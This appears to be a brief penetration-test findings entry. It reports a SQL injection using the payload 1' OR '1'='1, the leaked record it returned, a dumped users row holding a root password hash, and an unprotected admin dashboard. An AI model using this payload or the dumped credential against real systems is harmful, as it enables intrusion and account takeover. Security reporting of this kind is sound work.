# Findings
High: SQL injection. GET /policy/A-1003?id=1' OR '1'='1 returned HTTP 200 with
{"ref": "A-1003", "owner": "admin", "amount": 999999, "role": "root"} and I also
dumped the users table which contained {"user":"root","password":"5f4dcc3b5aa765d61d8327deb882cf99"}.
Also the endpoint /admin/dashboard is fully open (BFLA) - any user can read it.
